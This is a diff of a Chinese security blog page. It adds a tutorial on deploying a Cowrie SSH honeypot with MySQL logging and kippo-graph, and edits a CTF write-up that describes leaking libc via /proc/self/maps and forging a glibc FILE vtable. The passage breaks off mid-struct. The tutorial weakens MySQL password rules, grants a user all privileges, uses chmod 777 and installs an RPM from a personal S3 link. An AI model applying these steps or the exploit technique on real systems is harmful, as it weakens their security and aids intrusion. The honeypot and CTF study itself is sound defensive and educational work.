@@ -304,6 +304,206 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/12/cowrie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Talking is cheap, show me the code.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/12/cowrie/" itemprop="url">
+                  基于cowrie的SSH蜜罐搭建
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-03-12 21:54:03" itemprop="dateCreated datePublished" datetime="2019-03-12T21:54:03+08:00">2019-03-12</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/honeypot/" itemprop="url" rel="index"><span itemprop="name">honeypot</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/03/12/cowrie/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/03/12/cowrie/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/03/12/cowrie/" class="leancloud_visitors" data-flag-title="基于cowrie的SSH蜜罐搭建">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="基于cowrie的SSH蜜罐搭建"><a href="#基于cowrie的SSH蜜罐搭建" class="headerlink" title="基于cowrie的SSH蜜罐搭建"></a>基于cowrie的SSH蜜罐搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在实验室摸鱼，想接触一下蜜罐，遂问经验丰富的曹老师，从他那里得知了cowrie，于是查资料准备搭个简陋的出来</p>
+<h2 id="基本搭建及配置"><a href="#基本搭建及配置" class="headerlink" title="基本搭建及配置"></a>基本搭建及配置</h2><p>cowrie有自己的官网，上面有安装步骤，不过是针对Debian/Ubuntu的，在我阿里云的Centos上命令不能直接使用，需要找到Centos上对应的包</p>
+<h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>这次我们搭建的东西不是持久化的服务或者软件，因此保证物理环境的独立非常关键，cowrie提供了Docker用来Quick Star，希望简单体验的也可以直接用Docker。<br>新建用户cowrie:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd -m cowrie</span><br><span class="line">sudo passwd cowrie</span><br><span class="line">su - cowrie</span><br></pre></td></tr></table></figure></p>
+<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>安装依赖库:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y git python-virtualenv openssl-devel libffi libffi-devel gcc make python-devel</span><br></pre></td></tr></table></figure></p>
+<p>安装失败的authbind(选装):<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh https://s3.amazonaws.com/aaronsilber/public/authbind-2.1.1-0.1.x86_64.rpm</span><br></pre></td></tr></table></figure></p>
+<h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p>github下载cowrie<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> http://github.com/cowrie/cowrie</span><br><span class="line"><span class="built_in">cd</span> cowrie</span><br></pre></td></tr></table></figure></p>
+<h3 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h3><p>创建虚拟环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">virtualenv --python=python2 cowrie-env</span><br><span class="line"><span class="built_in">source</span> cowrie-env/bin/activate</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade -r requirements.txt</span><br></pre></td></tr></table></figure></p>
+<h3 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h3><p>这里官网的documentation里只是开了telnet，这里推荐一下一个比较完善的配置文件<a href="https://github.com/r3p3r/micheloosterhof-cowrie/blob/master/cowrie.cfg.dist" target="_blank" rel="noopener">cowrie.cfg.dist</a><br>官网的说法是cowrie.cfg.dist和cowrie.cfg都可以作为cowrie启动的配置文件，但是后者优先级更高一些，因此我们改为后者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp cowrie.cfg.dist cowrie.cfg</span><br></pre></td></tr></table></figure></p>
+<p>刚才提到的配置文件功能很多，我们挑比较简单的SSH蜜罐来配置<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[honeypot]</span></span><br><span class="line"><span class="attr">hostname</span> = Carter                     #主机名                     </span><br><span class="line"><span class="attr">log_path</span> = log                          #日志路径                   </span><br><span class="line"><span class="attr">download_path</span> = dl                   #上传文件的目录           </span><br><span class="line"><span class="attr">data_path</span> = data                       #数据目录，里面的userdb.txt保存了用户登录的弱口令，当攻击者  SSH登录符合其中规则时即可成功进入蜜罐 </span><br><span class="line"><span class="attr">contents_path</span> = honeyfs             #存储蜜罐里的配置文件，如passwd和shadow等    </span><br><span class="line"><span class="attr">filesystem_file</span> = data/fs.pickle      #蜜罐的文件系统</span><br><span class="line"><span class="attr">txtcmds_path</span> = txtcmds              #攻击者可以在蜜罐中执行的命令</span><br><span class="line"><span class="attr">ttylog</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">interactive_timeout</span> = <span class="number">180</span></span><br><span class="line"><span class="attr">backend</span> = shell</span><br><span class="line"><span class="attr">auth_class</span> = UserDB</span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span>                  </span><br><span class="line"><span class="attr">rsa_public_key</span> = etc/ssh_host_rsa_key.pub</span><br><span class="line"><span class="attr">rsa_private_key</span> = etc/ssh_host_rsa_key</span><br><span class="line"><span class="attr">dsa_public_key</span> = etc/ssh_host_dsa_key.pub</span><br><span class="line"><span class="attr">dsa_private_key</span> = etc/ssh_host_dsa_key</span><br><span class="line"><span class="attr">version</span> = SSH-<span class="number">2.0</span>-OpenSSH_6.<span class="number">0</span>p1 Debian-<span class="number">4</span>+deb7u2</span><br><span class="line"><span class="attr">listen_port</span> = <span class="number">60001</span>                    #实际蜜罐SSH的监听端口即重定向的端口        </span><br><span class="line"><span class="attr">listen_endpoints</span> = tcp:<span class="number">60001</span>:interface=<span class="number">0.0</span>.<span class="number">0.0</span>  </span><br><span class="line"><span class="attr">sftp_enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">forwarding</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">forward_redirect</span> = <span class="literal">false</span></span><br><span class="line"><span class="section">[telnet]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">false</span>         </span><br><span class="line"><span class="attr">listen_endpoints</span> = tcp:<span class="number">2223</span>:interface=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="section">[output_hpfeeds]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">server</span> = hpfeeds.mysite.org</span><br><span class="line"><span class="attr">port</span> = <span class="number">10000</span></span><br><span class="line"><span class="attr">identifier</span> = abc123</span><br><span class="line"><span class="attr">secret</span> = secret</span><br><span class="line"><span class="attr">debug</span>=<span class="literal">false</span></span><br><span class="line"><span class="section">[output_jsonlog]</span></span><br><span class="line"><span class="attr">logfile</span> = log/cowrie.json</span><br><span class="line"><span class="section">[output_mysql]</span>                      <span class="comment">#mysql配置</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">host</span> = localhost</span><br><span class="line"><span class="attr">database</span> = cowrie</span><br><span class="line"><span class="attr">username</span> = cowrie</span><br><span class="line"><span class="attr">password</span> = yourpassword</span><br><span class="line"><span class="attr">port</span> = <span class="number">3306</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="step6"><a href="#step6" class="headerlink" title="step6"></a>step6</h3><p>因为我们把SSH的22端口用来作为蜜罐端口，要把ssh的实际端口修改一下，以便我们自己登录，看之前blog里说nmap扫描的默认端口是到60000，因此我们设置其端口为60002，重启一下服务即可看到ssh的端口修改成功<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 60002</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br><span class="line">netstat -nultpn</span><br></pre></td></tr></table></figure>
+<h3 id="step7"><a href="#step7" class="headerlink" title="step7"></a>step7</h3><p>这里我们用的数据库是最简单的MySQL，上手比较容易，对于高并发大数据量的情景可以使用ES。<br>因为MySQL的密码强度要求，我们先修改一下MySQL的设置，在Centos下，它位于/etc/my.cnf<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">ql_mode</span>=IGNORE_SPACE,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</span><br></pre></td></tr></table></figure></p>
+<p>之后拿root登录，创建一个用户cowrie并且将权限赋予它<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> validate_password_length = <span class="number">6</span>;<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> validate_password_number_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> validate_password_policy=<span class="keyword">LOW</span>;</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">User</span> <span class="string">'cowrie@localhost'</span> <span class="keyword">Identified</span> <span class="keyword">By</span> <span class="string">'cowrie'</span>;</span><br><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> cowrie@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'cowrie'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure>
+<p>cowrie自带了sql的表，我们可以直接导入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/cowrie/cowrie/doc/sql/</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> cowrie;</span><br><span class="line"><span class="keyword">use</span> cowrie;</span><br><span class="line">source ./mysql.sql;</span><br></pre></td></tr></table></figure>
+<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>在cowrie文件夹的Bin目录下可以直接使用start启动<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./bin/cowrie start</span><br><span class="line">tail -f ./<span class="built_in">log</span>/cowrie.log</span><br></pre></td></tr></table></figure></p>
+<h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><p>由于我们配置的时候多采用默认的配置，导致一些设置对于攻击者来说很容易看出是cowrie布置的蜜罐，蜜罐的交互性越低诱惑性就越低，因此我们要尽量布置的真实一点，其中一个比较明显的特点就是cowrie的配置家目录和用户都是richard，至少先把这里改一下，使用Grep搜索本目录下所有关于richard的部分，改为Carter，替换可以用vim，全局替换<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./cowrie</span><br><span class="line">grep -rn <span class="string">"richard"</span> .</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:/<span class="number">1</span>,$s/richard/Carter</span><br></pre></td></tr></table></figure>
+<h2 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h2><p>cowrie作为一个比较经典的蜜罐有很多针对其的可视化工具，这里就介绍最简单的一种——kippo-graph，顾名思义它本当是Kippo的可视化工具，不过cowrie也可以用</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>这里使用apache作为Web服务器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yum install -y httpd php70w-mysql php70w-gd php70w-curl</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ikoniaris/kippo-graph.git</span><br><span class="line">cp -R ./kippo-graph/ /var/www/html/</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"><span class="built_in">cd</span> kippo-graph</span><br><span class="line">chmod 777 generated-graphs</span><br><span class="line">cp config.php.dist config.php</span><br></pre></td></tr></table></figure></p>
+<p>修改config.php的参数为自己数据库的信息<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define('DB_HOST', 'localhost');</span><br><span class="line">define('DB_USER', 'cowrie');</span><br><span class="line">define('DB_PASS', 'PASSWORD HERE');</span><br><span class="line">define('DB_NAME', 'cowrie');</span><br><span class="line">define('DB_PORT', '3306');</span><br></pre></td></tr></table></figure></p>
+<p>直接查看网页发现有报错，为mysql connect的错误，查错的日志为/var/log/httpd/error_log，这里排错排了很多，包括Php版本不对，缺少一些Php库，不一而足，查google改即可，另外可以写一些测试的php文件帮助排错</p>
+<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/2019/03/12/cowrie/kippo.jpg" alt="image"></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/07/applestore/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1956,7 +2156,7 @@
 <h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序也比较简单，用户输入文件名，打开之后每次读取0x18F字节，输出到屏幕上，关闭文件，退出。这里的exit前会让用户输入自己的姓名，name位于.bss段的0x0804B260处，而文件句柄fp位于.bss段的0x0804B280处。这里的scanf并没有限制输入的长度，因此存在溢出漏洞。</p>
 <p><img src="/2018/11/25/seethefile/1.jpg" alt="code"></p>
 <h2 id="数据构造"><a href="#数据构造" class="headerlink" title="数据构造"></a>数据构造</h2><h3 id="Libc基址"><a href="#Libc基址" class="headerlink" title="Libc基址"></a>Libc基址</h3><p>根据前面学到的知识，文件可以通过覆写vtable来修改一些函数指针指向我们想要执行的函数。因此，可以通过伪造FILE结构来执行shell，首先是libc基址的寻找，也正是在这里我直接卡住放弃的。看了p4nda师傅的wp得知文件执行的时候Linux会将进程的虚拟地址空间存储在/proc/<pid>/maps里，由于我们无从得知PID，因此使用self即可看到本进程的映射表，第一行libc.so的起始地址即为libc加载的基地址。这里还要注意由于read的长度有限，需要两次读才能读到libc.so。得到Libc基址之后即可得到system的地址。</pid></p>
-<h3 id="FILE结构体"><a href="#FILE结构体" class="headerlink" title="FILE结构体"></a>FILE结构体</h3><p>FILE结构体比较复杂，构造的时候要注意一些关键的验证条件要满足，这里给出CTF All In One的libio.h中的实现(glibc2.23)<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="FILE结构体"><a href="#FILE结构体" class="headerlink" title="FILE结构体"></a>FILE结构体</h3><p>FILE结构体比较复杂，构造的时候要注意一些关键的验证条件要满足，这里给出CTF All In One的libio.h中的实现(glibc2.23)<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* <span class="doctag">Note:</span>  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* End of put area. 